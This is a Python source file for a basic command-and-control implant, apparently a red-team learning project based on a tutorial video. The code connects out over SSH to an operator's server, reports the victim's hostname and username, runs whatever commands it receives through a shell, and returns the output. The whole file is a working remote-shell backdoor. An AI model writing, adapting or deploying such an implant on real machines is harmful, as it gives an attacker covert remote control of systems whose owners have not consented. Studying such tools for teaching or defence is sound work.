#!/usr/bin/env python3
#basic python C2 Implant (client)
#https://github.com/zweilosec
#based on Joe Helle's video https://www.youtube.com/watch?v=iP7eFbZPgss&list=PLJQHPJLj_SQb0gxh3kCeEurfwPtreQazg

import paramiko
import subprocess
import sys
import os
import shlex
import socket
import getpass
import argparse
from colorama import Fore, Style, init

#Parse arguments from the command line
parser = argparse.ArgumentParser(description='A simple Python SSH C2 Server.')
parser.add_argument('server', help='IP address of the server', nargs='?', const=1, default='127.0.0.1')
parser.add_argument('port', help='The port to serve SSH on.', nargs='?', const=1, type=int, default=2222)
parser.add_argument('-u', '--username',help='The SSH username to use.', nargs='?', const=1, default='sshuser')
parser.add_argument('-p', '--password',help='The SSH password to use.', nargs='?', const=1, default='sshpass')
parser.add_argument('-v', '--verbose', action='store_true')
args = parser.parse_args()

def createStyle():
    global success, informational, warning, fail, normal
    success, informational, warning, fail, normal = Fore.GREEN + Style.NORMAL, Fore.CYAN + Style.NORMAL, Fore.YELLOW + Style.DIM, Fore.RED + Style.BRIGHT, Fore.WHITE + Style.NORMAL

def verbose_print(to_print):
    if args.verbose:
        print(warning + to_print)

ip = args.server
port = args.port
username = args.username
password = args.password

def SSH_comm():
        
    SSH = paramiko.SSHClient()
    SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    SSH.connect(ip, port=port, username=username, password=password)

    open_SSH_session = SSH.get_transport().open_session()

    host_name = socket.gethostname() #get hostname of victim
    current_user = getpass.getuser() #get username of victim

    if open_SSH_session.active:
        open_SSH_session.send(f'Implant checked in from {host_name} ({ip}) as {current_user}.\n')
        print(open_SSH_session.recv(1).decode()) #accept one byte keepalive from server

        while True:
            command = open_SSH_session.recv(1024)

            try:
                SSH_command = command.decode()

                if SSH_command.strip() == 'exit': #kill shell if recieve 'exit'
                    open_SSH_session.send(f'Closing connection from {host_name} ({ip}).')
                    sys.exit()
                
                if SSH_command.split(" ")[0] == 'cd': #this is needed to change directories
                    path = SSH_command.split(" ")[1]
                    os.chdir(path)
                    newdir = os.getcwd()
                    open_SSH_session.send(f'{newdir}') #return new current dir from command to server
                else:
                    SSH_command_output = subprocess.check_output(shlex.split(shlex.quote(SSH_command)), stderr=subprocess.STDOUT, shell=True)
                    verbose_print(f'The command returned: {SSH_command_output.decode()}')
                    if SSH_command_output.decode() == '': #This is needed for commands that do not return anything, such as mkdir, rm, etc.
                        SSH_command_output = '\n' #return SOMETHING so the server doesn't hang waiting for a reply
                    open_SSH_session.send(SSH_command_output) #return output from command to server

            except Exception as e:
                verbose_print(f'[DEBUG] {e}')
                open_SSH_session.send(f'[Unknown Command] {e}')
            except KeyboardInterrupt:
                print(warning + 'Ctrl-C detected. Exiting...')
                quit()
    return

if __name__ == "__main__":
    init()
    createStyle()
    SSH_comm()
